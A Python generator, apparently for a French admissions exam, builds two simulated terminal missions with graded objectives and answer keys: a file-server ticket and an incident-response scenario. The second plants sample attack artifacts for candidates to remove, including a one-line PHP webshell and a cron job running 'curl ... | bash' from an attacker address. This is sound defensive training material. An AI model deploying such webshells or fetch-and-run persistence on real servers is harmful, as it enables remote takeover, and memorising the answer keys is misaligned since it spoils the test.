"""Scénarios des missions terminal d'admission (B3 et Mastère). Génère b3.json et mastere.json."""
import json, pathlib, random
HERE = pathlib.Path(__file__).resolve().parent
random.seed(2026)

# ---------------------------------------------------------------- B3 : technicien d'infrastructure
users = ["m.durand", "s.benali", "j.petit", "a.moreau", "svc-backup", "l.garcia"]
auth = []
for i in range(140):
    u = random.choice(users[:4] + ["l.garcia"])
    auth.append(f"Oct 30 0{random.randint(6,8)}:{random.randint(10,59)}:{random.randint(10,59)} srv-fic-01 sshd[{2000+i}]: Accepted password for {u} from 10.20.0.{random.randint(10,90)} port {random.randint(40000,60000)} ssh2")
for i in range(37):
    auth.append(f"Oct 30 03:{10+i//3:02d}:{random.randint(10,59)} srv-fic-01 sshd[{3000+i}]: Failed password for svc-backup from 10.20.0.66 port {random.randint(40000,60000)} ssh2")
for i in range(9):
    auth.append(f"Oct 30 07:{20+i}:{random.randint(10,59)} srv-fic-01 sshd[{3100+i}]: Failed password for j.petit from 10.20.0.31 port {random.randint(40000,60000)} ssh2")
random.shuffle(auth)

b3 = {
  "user": "tech", "hostname": "srv-fic-01", "home": "/home/tech",
  "motd": "Ticket #4127 : le serveur de fichiers srv-fic-01 sature et l'équipe compta se plaint.\nLis ~/TICKET.txt, puis remplis les missions. Tape « help » pour la liste des commandes.",
  "files": {
    "/home/tech/TICKET.txt": (
      "Ticket #4127, priorité haute\n-----------------------------\n"
      "1. Un processus lancé par le compte stagiaire occupe tout le processeur : arrête-le.\n"
      "2. Le disque est plein : dans /var/log/app, supprime l'archive qui occupe le plus de place\n"
      "   (garde les journaux du jour).\n"
      "3. Le dossier /srv/partage/compta est lisible par tout le monde : donne-lui les droits 770.\n"
      "4. Cette nuit, un compte a subi de nombreux échecs de connexion SSH (/var/log/auth.log).\n"
      "   Écris son nom, seul, dans ~/rapport.txt\n"),
    "/var/log/auth.log": "\n".join(auth) + "\n",
    "/var/log/app/app.log": "".join(f"2026-10-30 08:{m:02d} INFO requête traitée\n" for m in range(40)),
    "/var/log/app/app.log.1": "".join(f"2026-10-29 17:{m:02d} INFO requête traitée\n" for m in range(50)),
    "/var/log/app/debug-2026-09.log.old": {"content": "".join(f"2026-09-{d:02d} DEBUG trace détaillée de la requête {n} ................................\n" for d in range(1, 29) for n in range(30)), "owner": "tech", "mode": "644"},
    "/var/log/app/error.log.1": "2026-10-29 16:02 ERROR délai dépassé\n",
    "/srv/partage/compta/bilan-2026.xlsx": {"content": "(classeur)", "owner": "tech", "mode": "660"},
    "/srv/partage/rh/README.txt": {"content": "Dossier RH\n", "owner": "tech", "mode": "640"},
    "/etc/hostname": "srv-fic-01\n",
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ntech:x:1000:1000:Technicien:/home/tech:/bin/bash\nstagiaire:x:1001:1001:Stagiaire:/home/stagiaire:/bin/bash\nsvc-backup:x:1002:1002:Sauvegarde:/var/backups:/bin/bash\n",
  },
  "dirs": [{"path": "/srv/partage/compta", "mode": "777", "owner": "tech"}, {"path": "/var/log/app", "owner": "tech", "mode": "755"}, {"path": "/home/stagiaire", "mode": "700", "owner": "stagiaire"}],
  "denied": ["/root", "/home/stagiaire"],
  "processes": [
    {"pid": 1, "user": "root", "cmd": "/sbin/init", "cpu": 0.0, "mem": 0.1},
    {"pid": 388, "user": "root", "cmd": "/usr/sbin/sshd -D", "cpu": 0.0, "mem": 0.3},
    {"pid": 902, "user": "root", "cmd": "/usr/sbin/smbd --foreground", "cpu": 1.2, "mem": 2.0},
    {"pid": 1450, "user": "tech", "cmd": "/usr/bin/python3 /home/stagiaire/test_boucle.py", "cpu": 99.1, "mem": 3.4},
    {"pid": 1502, "user": "tech", "cmd": "-bash", "cpu": 0.0, "mem": 0.2},
  ],
  "listen": [{"port": 22, "process": "sshd"}, {"port": 445, "process": "smbd"}],
  "interfaces": [{"name": "eth0", "ip": "10.20.0.5/24"}],
  "objectives": [
    {"id": "cpu", "title": "Arrêter le processus qui sature le processeur", "check": {"type": "process_absent", "name": "test_boucle.py"}},
    {"id": "disk", "title": "Supprimer l'archive de logs la plus lourde", "check": {"type": "absent", "path": "/var/log/app/debug-2026-09.log.old"}},
    {"id": "acl", "title": "Mettre /srv/partage/compta en 770", "check": {"type": "mode", "path": "/srv/partage/compta", "mode": "770"}},
    {"id": "auth", "title": "Noter le compte attaqué dans ~/rapport.txt", "check": {"type": "equals", "path": "/home/tech/rapport.txt", "text": "svc-backup"}},
  ],
}

# ---------------------------------------------------------------- Mastère : réponse à incident
access = []
for i in range(120):
    ip = f"192.0.2.{random.randint(10,200)}"
    access.append(f'{ip} - - [30/Oct/2026:0{random.randint(6,9)}:{random.randint(10,59)}:{random.randint(10,59)} +0100] "GET /{random.choice(["", "produits", "contact", "panier", "static/app.js"])} HTTP/1.1" 200 {random.randint(200,9000)}')
attack = [
  '203.0.113.77 - - [30/Oct/2026:02:14:03 +0100] "GET /admin/upload.php HTTP/1.1" 200 812',
  '203.0.113.77 - - [30/Oct/2026:02:14:20 +0100] "POST /admin/upload.php HTTP/1.1" 200 64',
  '203.0.113.77 - - [30/Oct/2026:02:14:31 +0100] "GET /uploads/img_4471.php?c=id HTTP/1.1" 200 54',
  '203.0.113.77 - - [30/Oct/2026:02:15:02 +0100] "GET /uploads/img_4471.php?c=crontab%20-l HTTP/1.1" 200 12',
]
access = access[:60] + attack + access[60:]
mastere = {
  "user": "analyste", "hostname": "web-boutique", "home": "/home/analyste",
  "motd": "Alerte EDR : exécution de commandes inhabituelles par le serveur web cette nuit.\nLis ~/INCIDENT.txt, puis remplis les missions. Tape « help » pour la liste des commandes.",
  "files": {
    "/home/analyste/INCIDENT.txt": (
      "Incident 2026-114, sévérité haute\n---------------------------------\n"
      "1. Trouve dans les journaux web l'adresse IP de l'attaquant et écris-la, seule, dans ~/ioc/ip.txt\n"
      "2. L'attaquant a déposé un webshell dans le site : supprime-le.\n"
      "3. Il a installé une persistance qui contacte son serveur toutes les 10 minutes : supprime le script appelé.\n"
      "4. Le fichier de configuration du site, qui contient le mot de passe de la base, est lisible par tous :\n"
      "   donne-lui les droits 640.\n"
      "Le dossier ~/ioc n'existe pas encore.\n"),
    "/var/log/nginx/access.log": "\n".join(access) + "\n",
    "/var/www/html/index.php": {"content": "<?php require 'config.php'; ?>\n<h1>Boutique</h1>\n", "owner": "analyste", "mode": "644"},
    "/var/www/html/config.php": {"content": "<?php\n$db_user = 'boutique';\n$db_pass = 'Sup3rS3cret-2026';\n", "owner": "analyste", "mode": "644"},
    "/var/www/html/uploads/img_4470.jpg": {"content": "(image)", "owner": "analyste", "mode": "644"},
    "/var/www/html/uploads/img_4471.php": {"content": "<?php echo shell_exec($_GET['c']); ?>\n", "owner": "analyste", "mode": "644"},
    "/var/www/html/uploads/img_4472.jpg": {"content": "(image)", "owner": "analyste", "mode": "644"},
    "/var/tmp/.cache/sync.sh": {"content": "#!/bin/bash\ncurl -s http://203.0.113.77:8080/b | bash\n", "owner": "analyste", "mode": "755"},
    "/etc/hostname": "web-boutique\n",
    "/home/analyste/notes.txt": "Penser à regarder les tâches planifiées (crontab -l) et les dossiers temporaires.\n",
  },
  "dirs": [{"path": "/var/www/html/uploads", "owner": "analyste", "mode": "755"}, {"path": "/var/tmp/.cache", "owner": "analyste", "mode": "755"}],
  "denied": ["/root"],
  "crontab": "*/10 * * * * /var/tmp/.cache/sync.sh >/dev/null 2>&1",
  "processes": [
    {"pid": 1, "user": "root", "cmd": "/sbin/init", "cpu": 0.0, "mem": 0.1},
    {"pid": 501, "user": "root", "cmd": "nginx: master process", "cpu": 0.0, "mem": 0.5},
    {"pid": 502, "user": "analyste", "cmd": "php-fpm: pool www", "cpu": 0.8, "mem": 2.1},
    {"pid": 777, "user": "analyste", "cmd": "-bash", "cpu": 0.0, "mem": 0.2},
  ],
  "listen": [{"port": 80, "process": "nginx"}, {"port": 22, "process": "sshd"}],
  "interfaces": [{"name": "eth0", "ip": "198.51.100.20/24"}],
  "objectives": [
    {"id": "ip", "title": "Écrire l'IP de l'attaquant dans ~/ioc/ip.txt", "check": {"type": "equals", "path": "/home/analyste/ioc/ip.txt", "text": "203.0.113.77"}},
    {"id": "webshell", "title": "Supprimer le webshell", "check": {"type": "absent", "path": "/var/www/html/uploads/img_4471.php"}},
    {"id": "persist", "title": "Supprimer le script de persistance", "check": {"type": "absent", "path": "/var/tmp/.cache/sync.sh"}},
    {"id": "config", "title": "Mettre config.php en 640", "check": {"type": "mode", "path": "/var/www/html/config.php", "mode": "640"}},
  ],
}

MISSIONS = {
  "b3": {"prompt": "Mission terminal (environ 8 minutes). Un serveur de fichiers sature : résolvez le ticket en ligne de commande. Chaque mission réussie rapporte 1 point ; elles se valident toutes seules.", "scenario": b3},
  "mastere": {"prompt": "Mission terminal (environ 8 minutes). Un serveur web a été compromis cette nuit : enquêtez et remédiez en ligne de commande. Chaque mission réussie rapporte 1 point ; elles se valident toutes seules.", "scenario": mastere},
}
for k, v in MISSIONS.items():
    (HERE / f"{k}.json").write_text(json.dumps(v, ensure_ascii=False, indent=1))
